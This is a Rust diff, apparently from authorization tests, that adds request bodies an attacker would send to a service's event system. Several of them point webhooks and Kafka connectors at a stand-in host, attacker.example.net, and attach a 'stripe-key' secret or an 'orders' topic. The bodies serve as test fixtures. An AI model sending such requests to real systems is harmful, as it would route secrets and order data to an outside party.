@@ -40,6 +40,28 @@ fn body_of(operation: &str) -> Option<Value> {
         "bindWorker" => json!({"activities": ["*"]}),
         "putSecret" => json!({"value": "attacker-supplied-value-0001"}),
         "setEgressPolicy" => json!({"rules": ["attacker.example.net"]}),
+        // Feature 004: what an attacker would send to take over the victim's event plumbing.
+        "publishEvent" => json!({"type": "order.created", "data": {"attacker": true}}),
+        "createEventEndpoint" => json!({"slug": "attacker-endpoint", "secretName": "stripe-key"}),
+        "updateEventEndpoint" => json!({"secretName": "stripe-key"}),
+        "createWebhookSubscription" => json!({
+            "name": "attacker-hook", "url": "https://attacker.example.net/in",
+            "secretName": "stripe-key", "events": ["run.finished"]
+        }),
+        "updateWebhookSubscription" => json!({
+            "url": "https://attacker.example.net/in", "secretName": "stripe-key",
+            "events": ["run.finished"]
+        }),
+        "redriveWebhookDeliveries" => json!({}),
+        "createConnector" => json!({
+            "slug": "attacker-connector", "kind": "KAFKA",
+            "settings": {"servers": ["attacker.example.net:9092"], "topic": "orders", "startFrom": "earliest"}
+        }),
+        "updateConnector" => json!({
+            "kind": "KAFKA",
+            "settings": {"servers": ["attacker.example.net:9092"], "topic": "orders", "startFrom": "earliest"}
+        }),
+        "receiveSignedWebhook" => json!({"attacker": true}),
         _ => return None,
     })
 }
